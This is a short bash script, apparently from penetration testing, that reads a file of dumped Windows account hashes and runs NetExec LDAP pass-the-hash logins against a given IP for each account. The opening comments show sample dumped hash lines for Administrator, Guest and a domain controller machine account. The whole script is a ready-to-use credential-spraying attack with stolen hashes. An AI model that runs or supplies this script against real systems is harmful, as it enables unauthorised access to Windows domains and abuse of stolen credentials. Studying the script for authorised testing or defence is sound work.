#!/bin/bash
#test hash like below against an ip to see if you can login!
#Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
#Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::

# Check if the correct number of arguments is provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP_ADDRESS> <HASH_FILE>"
    exit 1
fi

IP_ADDRESS="$1"
HASH_FILE="$2"

# Check if the file exists
if [ ! -f "$HASH_FILE" ]; then
    echo "Error: File '$HASH_FILE' not found!"
    exit 1
fi

# Read through the file and extract username and NT hash
while IFS=':' read -r username rid lmhash nthash rest; do
    # Skip empty lines or improperly formatted ones
    if [[ -z "$username" || -z "$nthash" ]]; then
        continue
    fi

    # Run the command
    echo "Executing: nxc ldap $IP_ADDRESS -u $username -H $nthash"
    nxc ldap "$IP_ADDRESS" -u "$username" -H "$nthash"
done < "$HASH_FILE"
